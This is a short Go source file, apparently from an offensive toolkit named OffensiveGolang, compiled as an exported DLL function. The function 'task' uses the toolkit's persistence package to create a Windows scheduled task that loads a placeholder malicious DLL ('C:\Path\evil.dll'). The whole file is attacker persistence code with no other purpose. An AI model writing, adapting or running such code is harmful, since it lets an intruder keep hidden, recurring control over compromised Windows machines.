package main

import "C"
import (
	persistance "OffensiveGolang/pkg/persistence"
)

//export task
func task() {
	connection := persistance.GetConnection()
	persistance.CreateDllScheduledTask(connection, `\NAME-TASK`, `C:\Path\evil.dll`)
	persistance.DisconnectConnection(connection)
}

func main() {
	//Blank
}
